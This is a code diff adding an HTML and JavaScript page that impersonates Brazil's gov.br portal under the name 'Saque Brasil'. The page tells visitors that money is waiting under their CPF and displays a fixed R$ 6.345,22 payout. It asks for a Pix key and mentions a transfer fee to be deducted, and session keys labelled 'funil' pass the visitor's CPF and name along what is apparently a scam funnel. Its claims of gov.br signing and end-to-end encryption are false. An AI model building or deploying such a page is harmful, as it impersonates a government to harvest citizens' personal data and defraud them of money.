@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="preload" as="image" href="../../images/govbr-logo.png">
+  <link rel="stylesheet" href="../../css/styles-DzPR7eDw.css" data-precedence="default">
+  <title>Chave Pix — Saque Brasil</title>
+  <style>
+    html { scroll-behavior: smooth; }
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .animate-fade-in-up { animation: fadeInUp 0.6s ease-out forwards; opacity: 0; }
+    .hidden { display: none !important; }
+    
+    .pix-type-btn {
+      display: flex;
+      flex-direction: row;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      border-radius: 0.5rem;
+      border: 1px solid transparent;
+      background-color: rgb(241 245 249);
+      padding: 0.625rem;
+      font-size: 0.8125rem;
+      font-weight: 600;
+      color: var(--brand-navy, #1e3a8a);
+      transition: all 0.2s;
+    }
+    .pix-type-btn.active {
+      border-color: #22c55e;
+      background-color: rgba(34, 197, 94, 0.05);
+      color: #16a34a;
+    }
+    .pix-type-btn.active svg {
+      color: #16a34a;
+    }
+  </style>
+</head>
+<body class="antialiased overflow-x-hidden">
+  <div class="flex min-h-screen flex-col bg-background font-sans">
+    
+    <!-- Header Fixo -->
+    <div class="sticky top-0 z-30 bg-card/95 shadow-[var(--shadow-card)] backdrop-blur">
+      <header>
+        <div class="mx-auto flex h-14 max-w-2xl items-center justify-between gap-3 px-4">
+          <img src="../../images/govbr-logo.png" alt="gov.br" class="h-6 w-auto shrink-0 select-none" draggable="false">
+          <div class="flex items-center gap-3 text-brand-blue">
+            <button type="button" aria-label="Mais opções" class="shrink-0">
+              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-5"><circle cx="12" cy="12" r="1"></circle><circle cx="12" cy="5" r="1"></circle><circle cx="12" cy="19" r="1"></circle></svg>
+            </button>
+            <button type="button" aria-label="Cookies" class="shrink-0">
+              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-5"><path d="M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5"></path><path d="M8.5 8.5v.01"></path><path d="M16 15.5v.01"></path><path d="M12 12v.01"></path><path d="M11 17v.01"></path><path d="M7 14v.01"></path></svg>
+            </button>
+            <button type="button" aria-label="Aplicativos" class="shrink-0">
+              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-5"><rect width="7" height="7" x="3" y="3" rx="1"></rect><rect width="7" height="7" x="14" y="3" rx="1"></rect><rect width="7" height="7" x="14" y="14" rx="1"></rect><rect width="7" height="7" x="3" y="14" rx="1"></rect></svg>
+            </button>
+            <button type="button" aria-label="Conta" class="flex items-center gap-1.5 rounded-full bg-brand-blue px-3 py-1.5 text-sm font-semibold text-primary-foreground shadow-sm uppercase tracking-wide">
+              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-user size-4" aria-hidden="true"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+              <span id="header-user-name">ENTRAR</span>
+            </button>
+          </div>
+        </div>
+      </header>
+      <div class="h-px w-full bg-gradient-to-r from-transparent via-brand-blue/30 to-transparent"></div>
+      
+      <!-- Breadcrumbs -->
+      <div class="mx-auto flex max-w-2xl items-center gap-3 px-4 py-2.5">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-search size-5 shrink-0 text-brand-navy" aria-hidden="true"><circle cx="11" cy="11" r="8"></circle><path d="m21 21-4.3-4.3"></path></svg>
+        <nav aria-label="Trilha de navegação" class="min-w-0 flex-1">
+          <ol class="flex items-center gap-1.5 truncate text-[13px] text-brand-navy sm:text-sm">
+            <li class="truncate">Benefício</li>
+            <li aria-hidden="true">›</li>
+            <li class="truncate">Validação</li>
+            <li aria-hidden="true">›</li>
+            <li aria-current="page" class="truncate font-semibold">Chave Pix</li>
+          </ol>
+        </nav>
+      </div>
+    </div>
+
+    <!-- Main Content -->
+    <main class="mx-auto w-full max-w-2xl flex-1 px-4 pb-4 pt-4 animate-fade-in-up">
+      
+      <div id="step-form">
+        <div class="mb-4 rounded-2xl bg-gradient-to-r from-brand-green to-brand-green/80 px-4 py-3 text-center shadow-[var(--shadow-card)]">
+          <div class="flex items-center justify-center gap-2 text-primary-foreground">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-5"><circle cx="12" cy="12" r="10"></circle><path d="m9 12 2 2 4-4"></path></svg>
+            <span class="text-sm font-extrabold uppercase tracking-wide">Existem valores em seu CPF</span>
+          </div>
+          <p class="mt-1 text-xs text-primary-foreground/90">Informe sua chave Pix para receber</p>
+        </div>
+
+        <div class="rounded-2xl border border-border bg-card p-5 shadow-[var(--shadow-card)]">
+          <div class="flex flex-col items-center text-center">
+            <span class="grid size-12 place-items-center rounded-full bg-brand-green/15">
+              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-6 text-brand-green"><path d="M21 12V7H5a2 2 0 0 1 0-4h14v4"></path><path d="M3 5v14a2 2 0 0 0 2 2h16v-5"></path><path d="M18 12a2 2 0 0 0 0 4h4v-4Z"></path></svg>
+            </span>
+            <h1 class="mt-2 text-lg font-extrabold text-brand-navy">Dados para Recebimento</h1>
+            <p class="text-xs text-muted-foreground mt-0.5">Informe sua chave Pix.</p>
+          </div>
+
+          <div class="mt-4 rounded-lg bg-brand-blue/5 p-3 text-xs">
+            <div class="mb-1.5 font-bold text-brand-navy">Beneficiário:</div>
+            <div class="flex items-baseline justify-between gap-3">
+              <span class="text-brand-blue">Nome:</span>
+              <span class="text-right font-semibold text-brand-navy" id="display-nome">MARIA DAS GRAÇAS SOUZA</span>
+            </div>
+            <div class="mt-1 flex items-baseline justify-between gap-3">
+              <span class="text-brand-blue">CPF:</span>
+              <span class="text-right font-semibold text-brand-navy" id="display-cpf">000.000.000-00</span>
+            </div>
+          </div>
+
+          <div class="mt-4">
+            <div class="mb-2 text-[13px] font-bold text-brand-navy">Tipo de Chave PIX:</div>
+            <div class="grid grid-cols-2 gap-2.5">
+              <button type="button" class="pix-type-btn active" data-type="cpf">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-4 shrink-0"><path d="M2 12C2 6.5 6.5 2 12 2a10 10 0 0 1 8 4"></path><path d="M5 19.5C5.5 18 6.8 17 8.5 17c1.4 0 2.7.7 3.5 1.9"></path><path d="M12 17c1.7 0 3-1.3 3-3V9"></path><path d="M16.5 19c2.1-1.3 3.5-3.6 3.5-6.3 0-4.4-3.6-8-8-8-2.6 0-5 1.3-6.4 3.3"></path></svg>
+                CPF
+              </button>
+              <button type="button" class="pix-type-btn" data-type="email">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-4 shrink-0"><rect width="20" height="16" x="2" y="4" rx="2"></rect><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"></path></svg>
+                E-mail
+              </button>
+              <button type="button" class="pix-type-btn" data-type="telefone">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-4 shrink-0"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+                Telefone
+              </button>
+              <button type="button" class="pix-type-btn" data-type="aleatoria">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-4 shrink-0"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10"></path><path d="m9 12 2 2 4-4"></path></svg>
+                Aleatória
+              </button>
+            </div>
+          </div>
+
+          <div class="mt-4">
+            <label for="chave-pix" class="mb-1.5 block text-[13px] font-bold text-brand-navy">Chave PIX:</label>
+            <input id="chave-pix" type="text" placeholder="000.000.000-00" class="w-full rounded-lg border border-border bg-background px-3 py-2.5 text-sm font-medium text-brand-navy shadow-inner outline-none focus:border-brand-blue focus:ring-1 focus:ring-brand-blue/30" autocomplete="off">
+          </div>
+
+          <button type="button" id="btn-confirm-key" class="mt-4 flex w-full items-center justify-center gap-2 rounded-lg bg-gradient-to-r from-brand-green to-brand-green/80 px-4 py-3 text-sm font-extrabold uppercase tracking-wide text-primary-foreground shadow-[var(--shadow-card)] transition hover:brightness-110">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-4 shrink-0"><path d="M21 12V7H5a2 2 0 0 1 0-4h14v4"></path><path d="M3 5v14a2 2 0 0 0 2 2h16v-5"></path><path d="M18 12a2 2 0 0 0 0 4h4v-4Z"></path></svg>
+            CONFIRMAR CHAVE PIX
+          </button>
+          
+          <p class="mt-4 flex items-center justify-center gap-1.5 text-[11px] leading-relaxed text-muted-foreground">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-3"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+            Chave transmitida com criptografia ponta a ponta.
+          </p>
+        </div>
+        
+        <!-- Botão Voltar -->
+        <div class="mb-4">
+          <a href="consulte/3" class="flex items-center gap-2 text-sm font-semibold text-brand-blue hover:underline">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-4"><path d="m15 18-6-6 6-6"></path></svg>
+            Voltar para Meus Benefícios
+          </a>
+        </div>
+      </div>
+
+      <!-- Step Confirm -->
+      <div id="step-confirm" class="hidden animate-fade-in-up mt-4 overflow-hidden rounded-2xl border border-border bg-card shadow-[var(--shadow-card)]">
+        <!-- Header Azul -->
+        <div class="bg-brand-blue py-3 flex items-center justify-center gap-2 text-primary-foreground">
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10"></path><path d="m9 12 2 2 4-4"></path></svg>
+          <span class="text-sm font-extrabold uppercase tracking-wide">Confirmação Final</span>
+        </div>
+        
+        <div class="p-5">
+          <!-- Valor a receber -->
+          <div class="rounded-xl border border-[#bbf7d0] bg-[#dcfce7] py-6 text-center shadow-inner">
+            <div class="text-[12px] font-bold uppercase tracking-wider text-[#15803d]">Valor a receber via Pix</div>
+            <div class="mt-2 text-4xl sm:text-5xl font-extrabold text-[#16a34a] drop-shadow-sm" id="display-valor-receber">R$ 6.345,22</div>
+          </div>
+
+          <!-- Beneficiário -->
+          <div class="mt-4 rounded-xl bg-brand-blue/5 p-4 text-sm">
+            <div class="mb-2 text-[11px] font-bold uppercase tracking-wider text-brand-blue">Beneficiário</div>
+            <div class="flex items-baseline justify-between gap-3">
+              <span class="text-brand-blue">Nome</span>
+              <span class="text-right font-bold text-brand-navy" id="confirm-name"></span>
+            </div>
+            <div class="mt-1 flex items-baseline justify-between gap-3">
+              <span class="text-brand-blue">CPF</span>
+              <span class="text-right font-bold text-brand-navy" id="confirm-cpf"></span>
+            </div>
+          </div>
+
+          <!-- Chave Pix Destino -->
+          <div class="mt-4 rounded-xl border border-border bg-background p-4 text-sm">
+            <div class="flex items-center justify-between">
+              <span class="text-[11px] font-bold uppercase tracking-wider text-brand-navy">Chave Pix de Destino</span>
+              <button type="button" id="btn-edit-key" class="text-[13px] font-semibold text-brand-blue underline hover:text-brand-navy">corrigir</button>
+            </div>
+            <div class="mt-2 font-bold text-brand-navy tracking-wide" id="confirm-key-val"></div>
+          </div>
+
+          <!-- Aviso Amarelo -->
+          <div class="mt-4 flex items-center gap-3 rounded-xl border border-amber-300 bg-amber-50 px-4 py-2.5 text-sm text-amber-900">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-5 shrink-0"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10"></path><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
+            <div class="mt-6 flex flex-col items-center">
+              <p class="text-sm font-medium text-muted-foreground">A taxa de transferência será abatida no valor do saque.</p>
+              <a href="consulte/5" id="btn-final-confirm" class="mt-5 flex w-full items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-brand-green to-brand-green/80 px-4 py-4 text-[15px] font-extrabold uppercase tracking-wide text-primary-foreground shadow-[var(--shadow-card)] transition hover:brightness-110">
+                CONFIRMAR SAQUE
+              </a>
+            </div>
+          </div>
+          
+          <p class="mt-4 flex items-center justify-center gap-1.5 text-[11px] leading-relaxed text-muted-foreground">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-3"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+            Transação protegida e assinada digitalmente pelo gov.br
+          </p>
+        </div>
+      </div>
+
+      <!-- Modal Corrigir Chave -->
+      <div id="modal-edit-key" class="fixed inset-0 z-50 hidden flex-col items-center justify-center bg-black/60 backdrop-blur-sm px-4">
+        <div class="w-full max-w-md rounded-2xl bg-white p-6 shadow-2xl relative animate-fade-in-up">
+          <button type="button" id="btn-close-modal" class="absolute top-4 right-4 text-gray-400 hover:text-gray-700">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-5"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
+          </button>
+          
+          <h2 class="text-xl font-extrabold text-brand-navy">Corrigir chave Pix</h2>
+          <p class="mt-1 text-sm text-muted-foreground">Informe a nova chave Pix de destino para o recebimento.</p>
+          
+          <div class="mt-5">
+            <div class="mb-2 text-[13px] font-bold text-brand-navy">Tipo de Chave</div>
+            <div class="grid grid-cols-2 gap-2.5">
+              <button type="button" class="modal-pix-btn pix-type-btn active" data-type="cpf">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-4 shrink-0"><path d="M2 12C2 6.5 6.5 2 12 2a10 10 0 0 1 8 4"></path><path d="M5 19.5C5.5 18 6.8 17 8.5 17c1.4 0 2.7.7 3.5 1.9"></path><path d="M12 17c1.7 0 3-1.3 3-3V9"></path><path d="M16.5 19c2.1-1.3 3.5-3.6 3.5-6.3 0-4.4-3.6-8-8-8-2.6 0-5 1.3-6.4 3.3"></path></svg>
+                CPF
+              </button>
+              <button type="button" class="modal-pix-btn pix-type-btn" data-type="email">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-4 shrink-0"><rect width="20" height="16" x="2" y="4" rx="2"></rect><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"></path></svg>
+                E-mail
+              </button>
+              <button type="button" class="modal-pix-btn pix-type-btn" data-type="telefone">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-4 shrink-0"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+                Telefone
+              </button>
+              <button type="button" class="modal-pix-btn pix-type-btn" data-type="aleatoria">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-4 shrink-0"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10"></path><path d="m9 12 2 2 4-4"></path></svg>
+                Aleatória
+              </button>
+            </div>
+          </div>
+          
+          <div class="mt-4">
+            <label for="modal-chave-pix" class="mb-1.5 block text-[13px] font-bold text-brand-navy">Nova chave Pix</label>
+            <input id="modal-chave-pix" type="text" placeholder="000.000.000-00" class="w-full rounded-lg border border-border bg-background px-3 py-2.5 text-sm font-medium text-brand-navy shadow-inner outline-none focus:border-brand-blue focus:ring-1 focus:ring-brand-blue/30" autocomplete="off">
+          </div>
+          
+          <div class="mt-6 flex gap-3">
+            <button type="button" id="btn-cancel-modal" class="flex-1 rounded-lg border border-border bg-white px-4 py-3 text-sm font-bold text-brand-navy transition hover:bg-gray-50">Cancelar</button>
+            <button type="button" id="btn-save-modal" class="flex-1 rounded-lg bg-[#16a34a] px-4 py-3 text-sm font-extrabold uppercase tracking-wide text-white transition hover:bg-[#15803d]">Salvar Chave</button>
+          </div>
+        </div>
+      </div>
+
+    </main>
+
+    <!-- Footer -->
+    <div class="bg-background px-4 py-2 text-center text-[11px] text-muted-foreground">
+      <p class="flex flex-wrap items-center justify-center gap-x-1 gap-y-1">
+        <a href="termos.html" class="text-brand-blue underline hover:text-brand-navy">Termos de Uso</a><span aria-hidden="true">·</span>
+        <a href="privacidade.html" class="text-brand-blue underline hover:text-brand-navy">Privacidade</a><span aria-hidden="true">·</span>
+        <a href="lgpd.html" class="text-brand-blue underline hover:text-brand-navy">LGPD</a><span aria-hidden="true">·</span>
+        <a href="cookies.html" class="text-brand-blue underline hover:text-brand-navy">Cookies</a><span aria-hidden="true">·</span>
+        <a href="contato.html" class="text-brand-blue underline hover:text-brand-navy">Contato</a>
+      </p>
+    </div>
+    <footer class="bg-brand-navy px-6 py-6 text-center animate-fade-in-up flex flex-col items-center gap-3">
+      <img src="../../images/govbr-white.png" alt="gov.br" class="h-5 w-auto opacity-90">
+      <p class="text-xs text-primary-foreground/70">&copy; 2026 &mdash; Atendimento Online</p>
+    </footer>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const urlParams = new URLSearchParams(window.location.search);
+      let cpf = urlParams.get('cpf');
+      if (!cpf) cpf = sessionStorage.getItem('funil:cpf');
+      if (!cpf) { window.location.href = 'index.html'; return; }
+      
+      function formatCPF(v) {
+        v = v.replace(/\D/g, "");
+        if (v.length > 9) return v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+        return v;
+      }
+      
+      const formattedCpf = formatCPF(cpf);
+      
+      let nomeUsuario = 'MARIA DAS GRAÇAS SOUZA';
+      let valorReceber = 'R$ 6.345,22';
+      const dadosStr = sessionStorage.getItem('funil:dados');
+      if (dadosStr) {
+        try {
+          const dados = JSON.parse(dadosStr);
+          if (dados.NOME) nomeUsuario = dados.NOME;
+        } catch(e) {}
+      }
+      
+      const primeiroNome = nomeUsuario.split(' ')[0].toUpperCase();
+      document.getElementById('header-user-name').textContent = primeiroNome;
+      
+      document.getElementById('display-nome').textContent = nomeUsuario.toUpperCase();
+      document.getElementById('display-cpf').textContent = formattedCpf;
+      document.getElementById('btn-final-confirm').href = 'consulte/5?cpf=' + cpf.replace(/\D/g, "");
+      document.getElementById('display-valor-receber').textContent = valorReceber;
+
+      const input = document.getElementById('chave-pix');
+      input.value = formattedCpf;
+      
+      let currentKeyType = 'cpf';
+
+      // Máscara de Telefone
+      input.addEventListener('input', function(e) {
+        if (currentKeyType === 'telefone') {
+          let v = e.target.value.replace(/\D/g, "");
+          if (v.length > 11) v = v.slice(0, 11);
+          
+          if (v.length > 0) {
+            if (v.length <= 2) {
+              v = '(' + v;
+            } else if (v.length <= 7) {
+              v = '(' + v.slice(0,2) + ') ' + v.slice(2);
+            } else {
+              v = '(' + v.slice(0,2) + ') ' + v.slice(2,7) + '-' + v.slice(7);
+            }
+          }
+          e.target.value = v;
+        } else if (currentKeyType === 'cpf') {
+          let v = e.target.value.replace(/\D/g, "");
+          if (v.length > 11) v = v.slice(0, 11);
+          if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+          else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, "$1.$2.$3");
+          else if (v.length > 3) v = v.replace(/(\d{3})(\d{1,3})/, "$1.$2");
+          e.target.value = v;
+        }
+      });
+
+      const btns = document.querySelectorAll('#step-form .pix-type-btn');
+      btns.forEach(function(btn) {
+        btn.addEventListener('click', function() {
+          btns.forEach(b => b.classList.remove('active'));
+          btn.classList.add('active');
+          const type = btn.getAttribute('data-type');
+          currentKeyType = type;
+          
+          if (type === 'cpf') {
+            input.value = formattedCpf;
+            input.placeholder = "000.000.000-00";
+            input.setAttribute('inputmode', 'numeric');
+          } else if (type === 'telefone') {
+            input.value = "";
+            input.placeholder = "(11) 99999-9999";
+            input.setAttribute('inputmode', 'numeric');
+          } else if (type === 'email') {
+            input.value = "";
+            input.placeholder = "seuemail@exemplo.com.br";
+            input.setAttribute('inputmode', 'email');
+          } else {
+            input.value = "";
+            input.placeholder = "Chave aleatória";
+            input.setAttribute('inputmode', 'text');
+          }
+        });
+      });
+
+      const btnConfirm = document.getElementById('btn-confirm-key');
+      const stepForm = document.getElementById('step-form');
+      const stepConfirm = document.getElementById('step-confirm');
+
+      btnConfirm.addEventListener('click', function() {
+        if (!input.value.trim()) {
+          alert("Informe a chave Pix.");
+          return;
+        }
+        
+        const originalText = btnConfirm.innerHTML;
+        btnConfirm.innerHTML = '<svg class="size-5 animate-spin" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg> Confirmando...';
+        btnConfirm.disabled = true;
+
+        setTimeout(function() {
+          btnConfirm.innerHTML = originalText;
+          btnConfirm.disabled = false;
+          
+          stepForm.classList.add('hidden');
+          stepConfirm.classList.remove('hidden');
+          
+          document.getElementById('confirm-key-val').textContent = input.value;
+          document.getElementById('confirm-name').textContent = nomeUsuario.toUpperCase();
+          document.getElementById('confirm-cpf').textContent = formattedCpf;
+        }, 1200);
+      });
+
+      // Modal Logic
+      const modal = document.getElementById('modal-edit-key');
+      const btnEditKey = document.getElementById('btn-edit-key');
+      const modalInput = document.getElementById('modal-chave-pix');
+      const modalBtns = document.querySelectorAll('.modal-pix-btn');
+      let currentModalKeyType = 'cpf';
+
+      btnEditKey.addEventListener('click', function() {
+        modal.classList.remove('hidden');
+        modal.classList.add('flex');
+        modalInput.value = document.getElementById('confirm-key-val').textContent;
+      });
+
+      function closeModal() {
+        modal.classList.add('hidden');
+        modal.classList.remove('flex');
+      }
+      document.getElementById('btn-close-modal').addEventListener('click', closeModal);
+      document.getElementById('btn-cancel-modal').addEventListener('click', closeModal);
+
+      document.getElementById('btn-save-modal').addEventListener('click', function() {
+        if (!modalInput.value.trim()) {
+          alert("Informe a nova chave Pix.");
+          return;
+        }
+        document.getElementById('confirm-key-val').textContent = modalInput.value;
+        closeModal();
+      });
+
+      modalBtns.forEach(function(btn) {
+        btn.addEventListener('click', function() {
+          modalBtns.forEach(b => b.classList.remove('active'));
+          btn.classList.add('active');
+          const type = btn.getAttribute('data-type');
+          currentModalKeyType = type;
+          
+          if (type === 'cpf') {
+            modalInput.placeholder = "000.000.000-00";
+            modalInput.setAttribute('inputmode', 'numeric');
+          } else if (type === 'telefone') {
+            modalInput.placeholder = "(11) 99999-9999";
+            modalInput.setAttribute('inputmode', 'numeric');
+          } else if (type === 'email') {
+            modalInput.placeholder = "seuemail@exemplo.com.br";
+            modalInput.setAttribute('inputmode', 'email');
+          } else {
+            modalInput.placeholder = "Chave aleatória";
+            modalInput.setAttribute('inputmode', 'text');
+          }
+          modalInput.value = "";
+          modalInput.focus();
+        });
+      });
+
+      modalInput.addEventListener('input', function(e) {
+        if (currentModalKeyType === 'telefone') {
+          let v = e.target.value.replace(/\D/g, "");
+          if (v.length > 11) v = v.slice(0, 11);
+          if (v.length > 0) {
+            if (v.length <= 2) v = '(' + v;
+            else if (v.length <= 7) v = '(' + v.slice(0,2) + ') ' + v.slice(2);
+            else v = '(' + v.slice(0,2) + ') ' + v.slice(2,7) + '-' + v.slice(7);
+          }
+          e.target.value = v;
+        } else if (currentModalKeyType === 'cpf') {
+          let v = e.target.value.replace(/\D/g, "");
+          if (v.length > 11) v = v.slice(0, 11);
+          if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+          else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, "$1.$2.$3");
+          else if (v.length > 3) v = v.replace(/(\d{3})(\d{1,3})/, "$1.$2");
+          e.target.value = v;
+        }
+      });
+      
+      const btnFinalConfirm = document.getElementById('btn-final-confirm');
+      btnFinalConfirm.addEventListener('click', function(e) {
+        e.preventDefault();
+        const targetUrl = this.href;
+        this.innerHTML = '<svg class="size-5 animate-spin" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg> PROCESSANDO...';
+        this.style.pointerEvents = 'none';
+        
+        setTimeout(function() {
+          window.location.href = targetUrl;
+        }, 1500);
+      });
+    });
+  </script>
+</body>
+</html>
+
+
